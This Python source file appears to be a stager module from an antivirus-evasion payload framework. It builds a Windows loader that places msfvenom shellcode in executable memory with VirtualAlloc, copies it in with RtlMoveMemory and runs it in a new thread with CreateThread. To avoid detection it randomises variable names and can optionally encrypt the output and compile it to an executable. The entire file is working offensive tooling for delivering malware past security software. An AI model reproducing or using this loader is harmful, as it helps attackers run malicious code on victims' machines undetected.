"""

Inline shellcode injection.

Uses VirtualAlloc() to allocate space for shellcode, RtlMoveMemory() to 
copy the shellcode in, then calls CreateThread() to invoke.

Inspiration from http://www.debasish.in/2012/04/execute-shellcode-using-python.html

module by @christruncer

"""

from modules.common import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import crypters


class Stager:
	
	def __init__(self):
		# required options
		self.shortname = "VirtualAlloc"
		self.description = "Super basic allocation of memory through windows API, stashing shellcode in memory, and execution of the shellcode"
		self.language = "python"
		self.rating = "Normal"
		self.extension = "py"
		
		# optional
		self.shellcode = shellcode.Shellcode()
		# options we require user interaction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
						"use_pyherion" : ["N", "Use the pyherion encrypter"]}
		
	def generate(self):
		
		# Generate Shellcode Using msfvenom
		Shellcode = self.shellcode.generate()
		
		# Generate Random Variable Names
		ShellcodeVariableName = randomizer.randomString()
		RandPtr = randomizer.randomString()
		RandBuf = randomizer.randomString()
		RandHt = randomizer.randomString()
		
		# Create Payload code
		PayloadCode = 'import ctypes\n'
		PayloadCode += ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
		PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
		PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
		PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
		PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
		PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

		if self.required_options["use_pyherion"][0].lower() == "y":
			PayloadCode = crypters.pyherion(PayloadCode)

		return PayloadCode
